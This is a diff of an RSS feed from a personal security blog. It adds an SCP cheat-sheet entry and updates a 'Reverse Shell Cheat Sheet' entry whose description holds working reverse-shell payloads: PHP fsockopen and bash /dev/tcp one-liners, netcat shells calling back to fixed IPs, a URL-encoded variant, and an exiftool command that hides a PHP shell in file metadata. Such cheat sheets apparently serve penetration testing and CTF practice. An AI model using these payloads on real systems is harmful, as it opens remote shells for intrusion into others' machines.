@@ -5,13 +5,23 @@
     <link>https://fl1xh.github.io/tags/cheat-sheet/</link>
     <description>Recent content in Cheat-Sheet on Fl1x&#39;s Blog</description>
     <generator>Hugo -- gohugo.io</generator>
-    <lastBuildDate>Wed, 16 Mar 2022 14:34:07 +0100</lastBuildDate><atom:link href="https://fl1xh.github.io/tags/cheat-sheet/index.xml" rel="self" type="application/rss+xml" />
+    <copyright>This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.</copyright>
+    <lastBuildDate>Wed, 16 Mar 2022 22:43:04 +0100</lastBuildDate><atom:link href="https://fl1xh.github.io/tags/cheat-sheet/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>SCP Cheat Sheet</title>
+      <link>https://fl1xh.github.io/posts/scp_cheat_sheet/</link>
+      <pubDate>Wed, 16 Mar 2022 22:43:04 +0100</pubDate>
+      
+      <guid>https://fl1xh.github.io/posts/scp_cheat_sheet/</guid>
+      <description>Copying a file to the remote system using scp command scp file user@host:/path/to/file	Copying a file from the remote system using scp command scp user@host:/path/to/file /local/path/to/file Copying multiple files using scp command scp file1 file2 user@host:/path/to/directory	Copying an entire directory with scp command scp -r /path/to/directory user@host:/path/to/directory	Conditions -r # transfer directory -v # see the transfer details -C # copy files with compression -l 800 # limit bandwith with 800 -p # preserving the original attributes of the copied files -P # connection port -q # hidden the output</description>
+    </item>
+    
     <item>
       <title>Reverse Shell Cheat Sheet</title>
-      <link>https://fl1xh.github.io/posts/reverse-shell-cheat-sheet/</link>
+      <link>https://fl1xh.github.io/posts/reverse_shell_cheat_sheet/</link>
       <pubDate>Wed, 16 Mar 2022 14:34:07 +0100</pubDate>
       
-      <guid>https://fl1xh.github.io/posts/reverse-shell-cheat-sheet/</guid>
+      <guid>https://fl1xh.github.io/posts/reverse_shell_cheat_sheet/</guid>
       <description>PHP  oneliner  php -r &amp;#39;$sock=fsockopen(&amp;#34;172.16.1.1&amp;#34;,4445);exec(&amp;#34;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&amp;#34;);&amp;#39;  Same using URL encoding  php%20-r%20%27%24sock%3Dfsockopen%28%22172.16.1.1%22%2C4445%29%3Bexec%28%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27  Reverse-shell payload Windows  https://github.com/Dhayalanb/windows-php-reverse-shell
 &amp;lt;?php exec(&amp;#34;/bin/bash -c &amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.10/1234 0&amp;gt;&amp;amp;1&amp;#39;&amp;#34;); Netcat nc 172.16.1.1 4545 -e /bin/sh mknod /tmp/backpipe p /bin/sh 0&amp;lt;/tmp/backpipe | nc 172.16.1.1 4444 1&amp;gt;/tmp/backpipe Bash bash -i &amp;gt;&amp;amp; /dev/tcp/&amp;lt;IP&amp;gt;/&amp;lt;PORT&amp;gt; 0&amp;gt;&amp;amp;1 Exif of a file with php exiftool -Comment=&amp;#39;&amp;lt;?php $sock = fsockopen(&amp;#34;&amp;lt;IPADDRESS&amp;gt;&amp;#34;,&amp;lt;PORT&amp;gt;);$proc = proc_open(&amp;#34;/bin/sh -i&amp;#34;, array(0=&amp;gt;$sock, 1=&amp;gt;$sock, 2=&amp;gt;$sock), $pipes); ?</description>
     </item>
